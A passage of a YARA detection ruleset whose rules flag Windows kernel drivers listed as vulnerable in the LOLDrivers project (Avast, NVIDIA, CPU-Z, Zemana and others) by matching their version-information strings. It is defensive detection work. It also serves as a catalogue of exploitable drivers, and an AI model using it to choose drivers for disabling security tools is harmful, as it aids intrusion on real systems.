$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031003000300030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031003000300030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006f0074006900700063006900620075007300360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004b00650072006e0065006c0020004d006f00640065002000440072006900760065007200200054006f002000410063006300650073007300200050006800790073006900630061006c0020004d0065006d006f0072007900200041006e006400200050006f007200740073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006f0074006900700063006900620075007300360034002e007300790073 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_DCB8_RID3EE1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:56:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0037002e0034003200340036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0037002e0034003200340036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Micsystechnologycoltd_Msiosys_Msiodriverversion_X_CFCF_RID4296 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - MsIo64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:34:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0049004300530059005300200049004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0049004300530059005300200054006500630068006e006f006c006f0067007900200043006f002e002c0020004c00540064 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003200200078003600340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00320020007800360034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d00730049006f003600340020004400720069007600650072002000560065007200730069006f006e00200031002e0032 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100390020004d00490043005300590053 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_F8D4_RID4594 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:41:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e003800780036003400200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_D0E4_RID3C85 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:15:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e00350032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e00350032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_77DA_RID4222 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:14:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300035002e00310034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300035002e00310034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_0368_RID3785 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:42:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000310035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000310035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100360020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_B0DC_RID4228 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvaudio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:15:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e00300030002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00300030002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Radiantsystemsinc_Radhwmgrsys_Radiantsystemsinchardwaremanagerdriver_7C79_RID4A46 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RadHwMgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 07:02:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061006400690061006e00740020004800610072006400770061007200650020004d0061006e006100670065007200200066006f007200200050003100350078007800200050006c006100740066006f0072006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e0039002e0030002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0039002e0039002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e00200020004800610072006400770061007200650020004d0061006e00610067006500720020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0032003000300032002d0032003000300039002000520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Dtresearchinc_Iomemsys_Iomemsys_DD4A_RID3ACA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iomem64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:01:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044005400520020004b00650072006e0065006c0020006d006f006400650020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00440054002000520065007300650061007200630068002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0044005400200052006500730065006100720063006800200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Pchuntersys_Pchunter_1B7F_RID3664 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PCHunter.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:53:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00450070006f006f006c0073006f00660074002000570069006e0064006f0077007300200049006e0066006f0072006d006100740069006f006e0020005600690065007700200054006f006f006c0073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]4e00666e660e4e3aff0853174eacff094fe1606f6280672f67099650516c53f8 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0050004300480075006e007400650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0050004300480075006e007400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0050004300480075006e007400650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200032003000310033002d0032003000310036002000450070006f006f006c0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_6500_RID3EAB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:47:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0035002e0034003200320030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0035002e0034003200320030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_0FC3_RID3448 : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:23:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100340020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Netfiltersys_EDC6_RID3332 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:37:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570059004a00530051002000540044004900200048006f006f006b0020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]5b8f56fe65e05fe7 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0039002e00350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]65e05fe752a0901f56689a7152a865874ef6 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000770079006a00730071002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_E428_RID332E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:36:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310037002e003900380034 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrserverddkprovider_Cpuzsys_Windowsrserverddkdriver_BE68_RID461D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:04:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055002d005a0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_0909_RID3D9E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:02:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_3CB1_RID4218 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:13:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300035002e00310038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300035002e00310038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Watchdogdevelopmentcomllc_Wsdkdsys_Wsdkd_6278_RID3E60 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wsdkd.sys\"\n      author = \"Florian 